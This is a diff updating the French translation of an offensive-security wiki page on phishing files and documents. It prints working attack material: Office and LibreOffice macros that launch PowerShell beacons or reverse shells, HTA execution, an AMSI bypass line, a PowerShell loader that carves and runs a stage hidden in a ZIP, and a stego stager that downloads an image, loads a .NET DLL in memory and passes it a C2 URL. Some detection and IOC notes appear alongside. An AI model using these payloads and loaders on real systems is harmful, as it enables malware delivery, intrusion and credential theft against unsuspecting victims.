@@ -1,27 +1,27 @@
-# Phishing Files & Documents
+# Fichiers et documents de Phishing
 
 {{#include ../../banners/hacktricks-training.md}}
 
-## Office Documents
+## Documents Office
 
-Microsoft Word effectue une validation des données du fichier avant d’ouvrir un fichier. La validation des données est effectuée sous la forme d’une identification de structure de données, conformément au standard OfficeOpenXML. Si une erreur se produit pendant l’identification de la structure de données, le fichier analysé ne sera pas ouvert.
+Microsoft Word effectue une validation des données du fichier avant de l’ouvrir. La validation des données est effectuée sous la forme d’une identification de la structure des données, conformément au standard OfficeOpenXML. Si une erreur se produit lors de l’identification de la structure des données, le fichier analysé ne sera pas ouvert.
 
-En général, les fichiers Word contenant des macros utilisent l’extension `.docm`. Cependant, il est possible de renommer le fichier en changeant son extension tout en conservant la capacité d’exécuter des macros.\
-Par exemple, un fichier RTF ne prend pas en charge les macros, par conception, mais un fichier DOCM renommé en RTF sera pris en charge par Microsoft Word et pourra exécuter des macros.\
-Les mêmes éléments internes et mécanismes s’appliquent à tout le logiciel de la suite Microsoft Office (Excel, PowerPoint etc.).
+Habituellement, les fichiers Word contenant des macros utilisent l’extension `.docm`. Cependant, il est possible de renommer le fichier en modifiant son extension tout en conservant leurs capacités d’exécution des macros.\
+Par exemple, un fichier RTF ne prend pas en charge les macros, par conception, mais un fichier DOCM renommé en RTF sera traité par Microsoft Word et pourra exécuter des macros.\
+Les mêmes composants internes et mécanismes s’appliquent à tous les logiciels de la suite Microsoft Office (Excel, PowerPoint, etc.).
 
-Vous pouvez utiliser la commande suivante pour vérifier quelles extensions vont être exécutées par certains programmes Office :
+Vous pouvez utiliser la commande suivante pour vérifier quelles extensions seront exécutées par certains programmes Office :
 ```bash
 assoc | findstr /i "word excel powerp"
 ```
-Les fichiers DOCX faisant référence à un modèle distant (File –Options –Add-ins –Manage: Templates –Go) qui inclut des macros peuvent aussi « exécuter » des macros.
+Les fichiers DOCX faisant référence à un modèle distant (File –Options –Add-ins –Manage: Templates –Go) qui inclut des macros peuvent également « exécuter » des macros.
 
 ### External Image Load
 
 Allez à : _Insert --> Quick Parts --> Field_\
-_**Categories**: Links and References, **Filed names**: includePicture, et **Filename or URL**:_ http://<ip>/whatever
+_**Categories** : Links and References, **Field names** : includePicture, et **Filename or URL** :_ http://<ip>/whatever
 
-![Office Documents - External Image Load: Go to: Insert -- Quick Parts -- Field](<../../images/image (155).png>)
+![Documents Office - External Image Load : Allez à : Insert -- Quick Parts -- Field](<../../images/image (155).png>)
 
 ### Macros Backdoor
 
@@ -29,7 +29,7 @@ Il est possible d’utiliser des macros pour exécuter du code arbitraire depuis
 
 #### Autoload functions
 
-Plus elles sont courantes, plus l’AV a de chances de les détecter.
+Plus elles sont courantes, plus il est probable que l’AV les détecte.
 
 - AutoOpen()
 - Document_Open()
@@ -64,41 +64,41 @@ Dim proc As Object
 Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
 proc.Create "powershell <beacon line generated>
 ```
-#### Suppression manuelle des métadonnées
+#### Supprimer manuellement les métadonnées
 
 Allez dans **File > Info > Inspect Document > Inspect Document**, ce qui ouvrira le Document Inspector. Cliquez sur **Inspect**, puis sur **Remove All** à côté de **Document Properties and Personal Information**.
 
-#### Extension du document
+#### Extension Doc
 
-Une fois terminé, sélectionnez le menu déroulant **Save as type**, puis changez le format de **`.docx`** vers **Word 97-2003 `.doc`**.\
-Faites cela parce que vous **ne pouvez pas enregistrer de macros dans un `.docx`** et qu'il existe une **stigma** **autour** de l'extension **`.docm`** avec macros activées (par ex. l'icône de miniature a un énorme `!` et certaines passerelles web/email les bloquent entièrement). Par conséquent, cette **extension héritée `.doc` est le meilleur compromis**.
+Lorsque vous avez terminé, sélectionnez la liste déroulante **Save as type** et remplacez le format **`.docx`** par **Word 97-2003 `.doc`**.\
+Faites cela parce que vous **ne pouvez pas enregistrer de macros dans un `.docx`** et qu'il existe une **stigmatisation** **autour** de l'extension **`.docm`** compatible avec les macros (par exemple, l'icône miniature comporte un énorme `!` et certaines passerelles web/e-mail les bloquent complètement). Par conséquent, cette **ancienne extension `.doc` constitue le meilleur compromis**.
 
-#### Générateurs de macros malveillantes
+#### Générateurs de Malicious Macros
 
 - MacOS
 - [**macphish**](https://github.com/cldrn/macphish)
 - [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)
 
-## LibreOffice ODT auto-run macros (Basic)
+## Macros auto-run LibreOffice ODT (Basic)
 
-Les documents LibreOffice Writer peuvent intégrer des macros Basic et les exécuter automatiquement à l'ouverture du fichier en liant la macro à l'événement **Open Document** (Tools → Customize → Events → Open Document → Macro…). Une simple macro reverse shell ressemble à ceci :
+Les documents LibreOffice Writer peuvent intégrer des macros Basic et les exécuter automatiquement à l'ouverture du fichier en associant la macro à l'événement **Open Document** (Tools → Customize → Events → Open Document → Macro…).<sup>[[1]](#references)</sup> Une simple reverse shell macro ressemble à ceci :
 ```vb
 Sub Shell
 Shell("cmd /c powershell -enc BASE64_PAYLOAD"""")
 End Sub
 ```
-Notez les guillemets doublés (`""`) à l'intérieur de la chaîne – LibreOffice Basic les utilise pour échapper les guillemets littéraux, donc les payloads qui se terminent par `...==""")` gardent à la fois la commande interne et l'argument `Shell` équilibrés.
+Notez les guillemets doublés (`""`) à l’intérieur de la chaîne : LibreOffice Basic les utilise pour échapper les guillemets littéraux. Ainsi, les payloads qui se terminent par `...==""")` conservent à la fois la commande interne et l’argument Shell correctement équilibrés.
 
-Conseils de livraison :
+Conseils de delivery :
 
-- Enregistrez en `.odt` et liez la macro à l'événement du document afin qu'elle se déclenche immédiatement à l'ouverture.
-- Lors de l'envoi par email avec `swaks`, utilisez `--attach @resume.odt` (le `@` est requis pour que les octets du fichier, et non la chaîne du nom de fichier, soient envoyés en pièce jointe). C'est essentiel lors de l'abus de serveurs SMTP qui acceptent des destinataires `RCPT TO` arbitraires sans validation.
+- Enregistrez le fichier au format `.odt` et associez la macro à l’événement du document afin qu’elle s’exécute immédiatement à l’ouverture.
+- Lors de l’envoi avec `swaks`, utilisez `--attach @resume.odt` (le caractère `@` est requis pour que les octets du fichier, et non la chaîne correspondant au nom du fichier, soient envoyés en tant que pièce jointe). Cela est essentiel lors de l’abus de serveurs SMTP qui acceptent des destinataires `RCPT TO` arbitraires sans validation.
 
-## HTA Files
+## Fichiers HTA
 
-Un HTA est un programme Windows qui **combine HTML et des langages de scripting (tels que VBScript et JScript)**. Il génère l'interface utilisateur et s'exécute comme une application "fully trusted", sans les contraintes du modèle de sécurité d'un navigateur.
+Un HTA est un programme Windows qui **combine HTML et des langages de scripting (tels que VBScript et JScript)**. Il génère l’interface utilisateur et s’exécute comme une application « fully trusted », sans les contraintes du modèle de sécurité d’un navigateur.
 
-Un HTA est exécuté à l'aide de **`mshta.exe`**, qui est généralement **installé** avec **Internet Explorer**, ce qui rend **`mshta` dépendant d'IE**. Donc, s'il a été désinstallé, les HTA ne pourront pas s'exécuter.
+Un HTA est exécuté avec **`mshta.exe`**, qui est généralement **installé** avec **Internet Explorer**, ce qui rend **`mshta` dépendant d’IE**. S’il a donc été désinstallé, les HTA ne pourront pas s’exécuter.
 ```html
 <--! Basic HTA Execution -->
 <html>
@@ -153,11 +153,11 @@ var_func
 self.close
 </script>
 ```
-## Forcer l’authentification NTLM
+## Forcer l'authentification NTLM
 
-Il existe plusieurs façons de **forcer l’authentification NTLM "à distance"**, par exemple, vous pourriez ajouter des **images invisibles** à des emails ou HTML que l’utilisateur va consulter (même un HTTP MitM ?). Ou envoyer à la victime **l’adresse de fichiers** qui **déclencheront** une **authentification** simplement en **ouvrant le dossier**.
+Il existe plusieurs façons de **forcer l'authentification NTLM « à distance »** ; par exemple, vous pouvez ajouter des **images invisibles** dans des e-mails ou du HTML auxquels l'utilisateur accédera (même via un HTTP MitM ?). Vous pouvez également envoyer à la victime l'**adresse de fichiers** qui **déclencheront** une **authentification** dès l'**ouverture du dossier**.
 
-**Consultez ces idées et d’autres dans les pages suivantes :**
+**Consultez ces idées et bien d'autres dans les pages suivantes :**
 
 
 {{#ref}}
@@ -171,24 +171,24 @@ Il existe plusieurs façons de **forcer l’authentification NTLM "à distance"*
 
 ### NTLM Relay
 
-N’oubliez pas que vous pouvez non seulement voler le hash ou l’authentification, mais aussi **mener des attaques NTLM relay** :
+N'oubliez pas que vous pouvez non seulement voler le hash ou l'authentification, mais également **effectuer des attaques NTLM relay** :
 
 - [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
 - [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)
 
-## LNK Loaders + ZIP-Embedded Payloads (fileless chain)
+## LNK Loaders + ZIP-Embedded Payloads (chaîne fileless)
 
-Des campagnes très efficaces livrent un ZIP qui contient deux documents leurres légitimes (PDF/DOCX) et un .lnk malveillant. L’astuce est que le vrai loader PowerShell est stocké à l’intérieur des octets bruts du ZIP après un marqueur unique, et le .lnk l’extrait et l’exécute entièrement en mémoire.
+Les campagnes très efficaces livrent un ZIP contenant deux documents leurres légitimes (PDF/DOCX) ainsi qu'un fichier .lnk malveillant. L'astuce consiste à stocker le PowerShell loader réel à l'intérieur des raw bytes du ZIP, après un marqueur unique, puis à ce que le .lnk l'extrait et l'exécute entièrement en mémoire.<sup>[[2]](#references)</sup>
 
 Flux typique implémenté par le one-liner PowerShell du .lnk :
 
-1) Localiser le ZIP d’origine dans des chemins courants : Desktop, Downloads, Documents, %TEMP%, %ProgramData%, et le parent du répertoire de travail actuel.
-2) Lire les octets du ZIP et trouver un marqueur codé en dur (par ex. xFIQCV). Tout ce qui suit le marqueur est le payload PowerShell embarqué.
-3) Copier le ZIP vers %ProgramData%, l’extraire là-bas, et ouvrir le .docx leurre pour paraître légitime.
-4) Contourner AMSI pour le processus actuel : [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
-5) Déobfusquer l’étape suivante (par ex. supprimer tous les caractères #) et l’exécuter en mémoire.
+1) Rechercher le ZIP original dans les chemins courants : Desktop, Downloads, Documents, %TEMP%, %ProgramData% et le répertoire parent du répertoire de travail actuel.
+2) Lire les octets du ZIP et rechercher un marqueur codé en dur (par exemple, xFIQCV). Tout ce qui suit le marqueur constitue le PowerShell payload intégré.
+3) Copier le ZIP dans %ProgramData%, l'y extraire et ouvrir le .docx leurre pour paraître légitime.
+4) Bypasser AMSI pour le processus actuel : [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
+5) Désobfusquer la stage suivante (par exemple, supprimer tous les caractères #) et l'exécuter en mémoire.
 
-Exemple de squelette PowerShell pour extraire et exécuter l’étape embarquée :
+Exemple de squelette PowerShell pour extraire et exécuter la stage intégrée :
 ```powershell
 $marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
 $paths    = @(
@@ -206,34 +206,34 @@ $code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
 Invoke-Expression $code
 ```
 Notes
-- La livraison abuse souvent des sous-domaines PaaS réputés (par ex. *.herokuapp.com) et peut filtrer les payloads (servir des ZIP bénins selon l’IP/l’UA).
-- La next stage déchiffre fréquemment du shellcode base64/XOR et l’exécute via Reflection.Emit + VirtualAlloc pour minimiser les artefacts sur disque.
+- La livraison abuse souvent de sous-domaines PaaS réputés (p. ex. *.herokuapp.com) et peut filtrer les payloads (servir des ZIP bénins selon l’IP/l’UA).
+- L’étape suivante déchiffre fréquemment du shellcode encodé en base64/XOR et l’exécute via Reflection.Emit + VirtualAlloc afin de réduire les artefacts sur le disque.
 
-Persistence used in the same chain
-- COM TypeLib hijacking du contrôle Microsoft Web Browser afin que IE/Explorer ou toute app l’intégrant relance automatiquement le payload. Voir les détails et des commandes prêtes à l’emploi ici :
+Persistence utilisée dans la même chaîne
+- Détournement de COM TypeLib du contrôle Microsoft Web Browser afin qu’IE/Explorer ou toute application qui l’intègre relance automatiquement le payload.<sup>[[2]](#references)[[4]](#references)</sup> Voir les détails et les commandes prêtes à l’emploi ici :
 
 {{#ref}}
 ../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
 {{#endref}}
 
-Hunting/IOCs
-- Fichiers ZIP contenant la chaîne ASCII marqueur (par ex. xFIQCV) ajoutée aux données de l’archive.
-- .lnk qui énumère les dossiers parent/user pour localiser le ZIP et ouvre un document leurre.
-- AMSI tampering via [System.Management.Automation.AmsiUtils]::amsiInitFailed.
-- Threads métier de longue durée se terminant par des liens hébergés sous des domaines PaaS de confiance.
+Chasse/IOCs
+- Fichiers ZIP contenant la chaîne marqueur ASCII (p. ex. xFIQCV) ajoutée aux données de l’archive.
+- Fichier .lnk qui énumère les dossiers parent/utilisateur pour localiser le ZIP et ouvre un document leurre.
+- Altération d’AMSI via [System.Management.Automation.AmsiUtils]::amsiInitFailed.
+- Fils d’exécution métier de longue durée se terminant par des liens hébergés sous des domaines PaaS de confiance.
 
-## LNK decoy-first staging → scheduled-task persistence → trusted CPL side-loading
+## Staging « decoy-first » via LNK → persistence par tâche planifiée → side-loading de CPL de confiance
 
-Un autre schéma récurrent est un **`.lnk` usurpant un document** qui ouvre immédiatement un leurre bénin tout en préparant la vraie chaîne en arrière-plan.
+Un autre schéma récurrent est un **`.lnk` imitant un document** qui ouvre immédiatement un leurre bénin tout en préparant la chaîne réelle en arrière-plan.<sup>[[3]](#references)</sup>
 
 Workflow observé :
 1. Le raccourci **se fait passer pour un PDF** et utilise `conhost.exe` ou un proxy similaire pour lancer un downloader PowerShell obfusqué.
-2. Le PowerShell fragmente les tokens évidents (`iw''r`, `g''c''i`, `r''e''n`, `c''p''i`, `&(g''cm sch*)`) afin que les détections naïves cherchant `iwr`, `gci`, `ren`, `cpi` ou `schtasks` ratent la commande.
-3. Le stager télécharge d’abord le **document leurre**, l’ouvre pour la victime, puis reconstruit les fichiers malveillants en arrière-plan.
-4. Les payloads peuvent être écrits avec des **junk extensions** puis renommés en supprimant les caractères de remplissage, retardant l’apparition d’artefacts évidents `.exe` / `.cpl`.
-5. La persistence est établie avec une **scheduled task basée sur les minutes** qui lance un binary hôte de confiance depuis un chemin inscriptible par l’utilisateur.
+2. PowerShell fragmente les tokens évidents (`iw''r`, `g''c''i`, `r''e''n`, `c''p''i`, `&(g''cm sch*)`) afin que les détections naïves recherchant `iwr`, `gci`, `ren`, `cpi` ou `schtasks` ne détectent pas la commande.
+3. Le stager télécharge **d’abord le document leurre**, l’ouvre pour la victime, puis reconstruit les fichiers malveillants en arrière-plan.
+4. Les payloads peuvent être écrits avec des **extensions factices**, puis renommés en supprimant les caractères de remplissage, retardant l’apparition d’artefacts `.exe` / `.cpl` évidents.
+5. La persistence est établie avec une **tâche planifiée basée sur les minutes** qui lance un binaire hôte de confiance depuis un chemin accessible en écriture par l’utilisateur.
 
-Minimal hunting clues from this pattern:
+Indices minimaux de chasse issus de ce schéma :
 ```powershell
 # Suspicious split-token PowerShell seen in LNK chains
 iw''r
@@ -246,19 +246,19 @@ Une disposition de staging utile à reconnaître est :
 - `C:\Users\Public\<malicious>.cpl` ou `.dll`
 - `C:\Windows\Tasks\<blob>.dat`
 
-### Why the second stage is stealthy
+### Pourquoi le second stage est furtif
 
-Dans l’étude de cas Rapid7, la tâche planifiée lançait à répétition **`Fondue.exe`** depuis `C:\Users\Public\`. Comme **`APPWIZ.cpl`** était staged à côté et exportait **`RunFODW`**, le binaire Microsoft de confiance side-loadait le CPL de l’attaquant au lieu de la copie légitime du système.
+Dans l’étude de cas de Rapid7, la tâche planifiée lançait régulièrement **`Fondue.exe`** depuis `C:\Users\Public\`. Comme **`APPWIZ.cpl`** était placé à côté et exportait **`RunFODW`**, le binaire Microsoft de confiance chargeait en side-loading le CPL de l’attaquant au lieu de la copie système légitime.
 
 Le CPL :
 - Lit un blob **AES-256-CBC** depuis `C:\Windows\Tasks\editor.dat`
 - Le déchiffre via **Windows CNG / `bcrypt.dll`**
-- Alloue de la mémoire exécutable et copie le shellcode déchiffré
+- Alloue une mémoire exécutable et y copie le shellcode déchiffré
 - L’exécute indirectement en passant le pointeur du shellcode comme callback pour **`EnumUILanguagesW`**
 
-Cette dernière étape mérite une chasse séparée : les malwares évitent souvent un saut direct `((void(*)())buf)()` et abusent à la place d’un **WinAPI légitime prenant un callback** pour transférer l’exécution.
+Cette dernière étape mérite d’être recherchée séparément : les malwares évitent souvent un saut direct de type `((void(*)())buf)()` et détournent plutôt une **WinAPI légitime acceptant un callback** pour transférer l’exécution.
 
-Le payload déchiffré dans cette campagne était du shellcode **Donut**, qui a ensuite mappé le PE final entièrement en mémoire et patché **AMSI/WLDP/ETW** dans le processus courant avant de transférer l’exécution. Pour des notes plus approfondies sur le side-loading et le post-traitement en mémoire, voir :
+Le payload déchiffré dans cette campagne était du shellcode **Donut**, qui mappait ensuite entièrement le PE final en mémoire et patchait **AMSI/WLDP/ETW** dans le processus courant avant de transférer l’exécution. Pour des notes plus détaillées sur le side-loading et le post-traitement résidant en mémoire, voir :
 
 {{#ref}}
 ../../windows-hardening/windows-local-privilege-escalation/dll-hijacking/README.md
@@ -268,21 +268,21 @@ Le payload déchiffré dans cette campagne était du shellcode **Donut**, qui a 
 ../../windows-hardening/av-bypass.md
 {{#endref}}
 
-Pivots de chasse pratiques :
+Pivots de recherche pratiques :
 - `.lnk` lançant `powershell.exe` ou `conhost.exe`, suivi d’un document leurre visible.
-- Téléchargements de courte durée vers **`C:\Users\Public\`** suivis immédiatement de renommages depuis des extensions absurdes.
-- Tâches planifiées avec des noms banals comme `GoogleErrorReport` exécutées depuis des **répertoires inscriptibles par l’utilisateur**.
+- Téléchargements de courte durée vers **`C:\Users\Public\`**, suivis de renommages immédiats depuis des extensions sans signification.
+- Tâches planifiées portant des noms anodins tels que `GoogleErrorReport` et s’exécutant depuis des **répertoires accessibles en écriture par l’utilisateur**.
 - Binaires de confiance chargeant des fichiers **`.cpl` / `.dll`** depuis le même répertoire non système.
-- Blobs texte Base64 écrits sous **`C:\Windows\Tasks\`** puis lus par le module side-loadé.
+- Blobs texte Base64 écrits sous **`C:\Windows\Tasks\`**, puis lus par le module chargé en side-loading.
 
-## Charges utiles délimitées par stéganographie dans des images (PowerShell stager)
+## Payloads délimités par stéganographie dans des images (PowerShell stager)
 
-Des chaînes de loader récentes livrent un JavaScript/VBS obfusqué qui décode et exécute un stager PowerShell en Base64. Ce stager télécharge une image (souvent GIF) qui contient une DLL .NET encodée en Base64, cachée comme texte brut entre des marqueurs de début/fin uniques. Le script recherche ces délimiteurs (exemples observés dans la nature : «<<sudo_png>> … <<sudo_odt>>>»), extrait le texte entre les deux, le Base64-décode en octets, charge l’assembly en mémoire et appelle une méthode d’entrée connue avec l’URL C2.
+Les chaînes de chargement récentes délivrent un JavaScript/VBS obfusqué qui décode et exécute un stager PowerShell encodé en Base64. Ce stager télécharge une image (souvent un GIF) contenant une DLL .NET encodée en Base64 et dissimulée sous forme de texte brut entre des marqueurs uniques de début et de fin. Le script recherche ces délimiteurs (exemples observés dans la nature : «<<sudo_png>> … <<sudo_odt>>>»), extrait le texte intermédiaire, le décode en Base64 vers des octets, charge l’assembly en mémoire et invoque une méthode d’entrée connue avec l’URL C2.<sup>[[5]](#references)</sup>
 
 Workflow
-- Stage 1: Dropper JS/VBS archivé → décode le Base64 embarqué → lance le stager PowerShell avec -nop -w hidden -ep bypass.
-- Stage 2: PowerShell stager → télécharge l’image, extrait le Base64 délimité par les marqueurs, charge la DLL .NET en mémoire et appelle sa méthode (par ex., VAI) en passant l’URL C2 et les options.
-- Stage 3: Le loader récupère le payload final et l’injecte généralement via process hollowing dans un binaire de confiance (couramment MSBuild.exe). Voir plus d’informations sur process hollowing et l’exécution via un utilitaire de confiance ici :
+- Stage 1 : Dropper JS/VBS archivé → décode le Base64 intégré → lance le stager PowerShell avec -nop -w hidden -ep bypass.
+- Stage 2 : Stager PowerShell → télécharge l’image, extrait le Base64 délimité par les marqueurs, charge la DLL .NET en mémoire et appelle sa méthode (par exemple, VAI) en lui transmettant l’URL C2 et les options.
+- Stage 3 : Le Loader récupère le payload final et l’injecte généralement par process hollowing dans un binaire de confiance (couramment MSBuild.exe).<sup>[[7]](#references)[[8]](#references)</sup> Pour en savoir plus sur le process hollowing et l’exécution via des utilitaires de confiance, voir ici :
 
 {{#ref}}
 ../../reversing/common-api-used-in-malware.md
@@ -291,7 +291,7 @@ Workflow
 Exemple PowerShell pour extraire une DLL d’une image et invoquer une méthode .NET en mémoire :
 
 <details>
-<summary>PowerShell stego payload extractor and loader</summary>
+<summary>Extracteur et Loader de payload stego PowerShell</summary>
 ```powershell
 # Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
 param(
@@ -316,48 +316,48 @@ $null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
 </details>
 
 Notes
-- This is ATT&CK T1027.003 (steganography/marker-hiding). Les marqueurs varient selon les campagnes.
-- AMSI/ETW bypass et la déobfuscation des chaînes sont souvent appliqués avant le chargement de l'assembly.
-- Hunting: analysez les images téléchargées à la recherche de délimiteurs connus ; identifiez PowerShell accédant à des images puis décodant immédiatement des blobs Base64.
+- Il s’agit de ATT&CK T1027.003 (steganography/marker-hiding).<sup>[[6]](#references)</sup> Les marqueurs varient selon les campagnes.
+- Les contournements AMSI/ETW et la désobfuscation des chaînes sont généralement appliqués avant le chargement de l’assembly.
+- Hunting : analyser les images téléchargées à la recherche de délimiteurs connus ; identifier les accès de PowerShell aux images suivis immédiatement du décodage de blobs Base64.
 
-Voir aussi les outils stego et les techniques de carving :
+Voir également les outils de stego et les techniques de carving :
 
 {{#ref}}
 ../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
 {{#endref}}
 
-## JS/VBS droppers → Base64 PowerShell staging
+## JS/VBS droppers → staging PowerShell Base64
 
-Une première étape récurrente est un petit `.js` ou `.vbs` fortement obfusqué, livré dans une archive. Son seul but est de décoder une chaîne Base64 intégrée et de lancer PowerShell avec `-nop -w hidden -ep bypass` pour amorcer l'étape suivante via HTTPS.
+Une étape initiale récurrente consiste en un petit fichier `.js` ou `.vbs`, fortement obfusqué et livré dans une archive. Son seul objectif est de décoder une chaîne Base64 intégrée et de lancer PowerShell avec `-nop -w hidden -ep bypass` afin d’amorcer l’étape suivante via HTTPS.<sup>[[5]](#references)</sup>
 
-Logique schématique (abstraite) :
+Logique simplifiée (abstraite) :
 - Lire le contenu de son propre fichier
-- Localiser un blob Base64 entre des chaînes inutiles
+- Localiser un blob Base64 entre des chaînes parasites
 - Décoder en PowerShell ASCII
-- Exécuter avec `wscript.exe`/`cscript.exe` invoquant `powershell.exe`
+- Exécuter avec `wscript.exe`/`cscript.exe` en invoquant `powershell.exe`
 
-Indices de hunting
-- Pièces jointes archivées JS/VBS lançant `powershell.exe` avec `-enc`/`FromBase64String` dans la ligne de commande.
+Indicateurs de hunting
+- Pièces jointes JS/VBS archivées lançant `powershell.exe` avec `-enc`/`FromBase64String` dans la ligne de commande.
 - `wscript.exe` lançant `powershell.exe -nop -w hidden` depuis des chemins temporaires utilisateur.
 
-## Windows files to steal NTLM hashes
+## Fichiers Windows permettant de voler des hashes NTLM
 
-Consultez la page sur les **places to steal NTLM creds** :
+Consultez la page sur les **emplacements permettant de voler des identifiants NTLM** :
 
 {{#ref}}
 ../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
 {{#endref}}
 
 
-## References
+## Références
 
-- [HTB Job – LibreOffice macro → IIS webshell → GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
-- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
-- [Rapid7 – Malware à la Mode: Tracking Dropping Elephant Tradecraft Through a China-Themed Loader Chain](https://www.rapid7.com/blog/post/tr-malware-tracking-dropping-elephant-tradecraft-china-themed-loader-chain)
-- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
-- [Unit 42 – PhantomVAI Loader Delivers a Range of Infostealers](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
-- [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
-- [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
-- [MITRE ATT&CK – Trusted Developer Utilities Proxy Execution: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)
+- [1] [HTB Job – macro LibreOffice → webshell IIS → GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
+- [2] [Check Point Research – Campagne ZipLine : une attaque de phishing sophistiquée ciblant des entreprises américaines](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
+- [3] [Rapid7 – Malware à la Mode : suivi du tradecraft de Dropping Elephant à travers une chaîne de loaders sur le thème de la Chine](https://www.rapid7.com/blog/post/tr-malware-tracking-dropping-elephant-tradecraft-china-themed-loader-chain)
+- [4] [Hijack the TypeLib – Nouvelle technique de persistence COM (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
+- [5] [Unit 42 – Le loader PhantomVAI distribue toute une gamme d’infostealers](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
+- [6] [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
+- [7] [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
+- [8] [MITRE ATT&CK – Trusted Developer Utilities Proxy Execution: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)
 
 {{#include ../../banners/hacktricks-training.md}}
